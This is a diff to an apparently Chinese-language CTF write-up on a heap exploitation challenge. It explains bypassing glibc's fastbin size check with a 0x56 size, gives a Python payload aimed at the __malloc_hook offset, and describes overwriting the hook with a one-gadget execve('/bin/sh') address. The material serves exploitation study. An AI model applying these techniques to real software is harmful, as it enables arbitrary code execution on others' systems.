@@ -54,7 +54,51 @@ def s_leak():
 .text:000000000008362A                 and     rax, 0FFFFFFFFFC000000h
 .text:0000000000083630                 mov     rcx, [rax]
 ```
-发现malloc会堆fastbin的地址检查，要是在**0FFFFFFFFFC000000h**之外，这里就会出错。orz
+发现malloc会堆fastbin的地址检查，要是在**0FFFFFFFFFC000000h**之外<br>
+![Struct](chk0x04.png)
+这里就会出错。orz<br>
+
+### orz
+
+后来问了下博客的dalao，原来，应该是0x56主要可以绕过，是我没有看清楚orz，感谢dalao耐心解答。<br>
+因为之前还有个对size的检查。 如果是0x56(0x‭0101 0110‬)<br>
+```assembly
+mov     rax, [rdx-8]
+test    al, 2
+jnz     short loc_7F93D30EE63
+```
+这个就可以直接返回正确了 :)<br>
+主要代码如下<br>
+```python
+payload = chr(0)*3
+payload += p64(0)*4
+payload += p64(libc_base_addr+0x3C3AF8)     # hook offset
+payload += p64(0)
+payload += p64(libc_base_addr+0x3C3B78)*2
+payload = payload.ljust(0x41, chr(0)) + '\n'
+put_milk(payload, "red")
+```
+
+### overwrite
+
+首先想到的是能不能覆盖个rop的地址，偏移到输入字符串的位置，但是在覆盖了 hook_malloc 之后<br>
+程序立即调用了malloc，而且偏移起来比较麻烦。<br>
+```assembly
+call    @create_milk_string     ; 申请milk string
+mov     r15, rax
+mov     edx, 19h
+lea     rsi, aInputYourMilkS ; "Input your milk's color: "
+lea     rdi, _ZSt4cout  ; std::cout
+call    cout
+lea     rdi, [rsp+68h+s2]
+mov     esi, 0Fh
+call    @get_str
+mov     edi, 10h        ; unsigned __int64
+call    malloc          ;
+```
+而最简单的是直接覆盖一个 execve("/bin/sh")地址。<br>
+用ida搜索text就能找到 "/bin/sh"字符串，然后再找找，就能找到合适的地址执行exece，本机的libc中是0xf0567这个
+
 
 ### house of orange
 
